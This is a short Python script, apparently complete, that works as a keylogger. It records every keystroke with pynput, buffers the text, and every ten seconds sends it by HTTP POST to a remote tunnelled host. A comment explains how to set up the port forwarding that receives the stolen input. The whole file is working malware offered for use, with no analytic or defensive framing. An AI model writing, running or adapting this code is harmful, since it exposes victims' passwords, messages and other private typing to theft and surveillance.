import requests
import time
import threading
from pynput.keyboard import Listener


WEBHOOK_URL = "http://aeiok-196-191-61-129.run.pinggy-free.link" # start port fwarding on port 6060 and put the link here
SEND_INTERVAL_SECONDS = 10

log_buffer = ""
buffer_lock = threading.Lock()

def send_logs_over_internet():
    
    global log_buffer
    while True:
        time.sleep(SEND_INTERVAL_SECONDS)
        
        with buffer_lock:
            if not log_buffer:
                continue
            data_to_send = log_buffer
            log_buffer = ""  
        
        try:
            
            response = requests.post(WEBHOOK_URL, data={"logs": data_to_send}, timeout=10)
            
            
            if response.status_code != 200:
                with buffer_lock:
                    log_buffer = data_to_send + log_buffer
        except requests.exceptions.RequestException:
          
            with buffer_lock:
                log_buffer = data_to_send + log_buffer

def on_press(key):
    global log_buffer
    try:
        clean_key = str(key).replace("'", "")
        
        if clean_key == "Key.space":
            clean_key = " "
        elif clean_key == "Key.enter":
            clean_key = "\n"
        elif "Key" in clean_key:
            clean_key = f" [{clean_key}] "
            
        with buffer_lock:
            log_buffer += clean_key
    except Exception:
        pass

internet_thread = threading.Thread(target=send_logs_over_internet, daemon=True)
internet_thread.start()


with Listener(on_press=on_press) as listener:
    listener.join()
